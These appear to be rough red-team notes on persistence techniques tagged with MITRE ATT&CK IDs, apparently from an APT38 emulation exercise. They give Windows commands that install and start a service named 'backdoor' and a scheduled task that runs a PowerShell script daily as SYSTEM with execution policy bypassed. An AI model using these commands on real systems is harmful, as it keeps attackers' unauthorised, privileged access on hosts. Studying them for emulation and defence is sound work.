Created or modify System Process =>

Windows Service T1543.003

```cmd
sc create backdoor binPath= "C:\Users\soheil\Desktop\APT38\5-Persistence\Windows Service T1543.003\backdoor.exe" type= share start=auto
sc config backdoor DisplayName= "backdoor"
sc description backdoor "create backdoor"
sc start backdoor
sc delete backdoor

```


Scheduled Task/job =>
```cmd
schtasks /Create /SC DAILY /TN "MyTask" /TR "powershell.exe -ExecutionPolicy Bypass -File 'c:\users\public\backup.ps1'" /ST 00:01 /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /IT
```
```
```cmd
schtasks /Query /TN "MyTask"
```
```cmd
schtasks /Run /TN "MyTask"
Cron T1053.003

```

Scheduled Task T1053.005

Server Software Component =>

Web Shell T1505.003
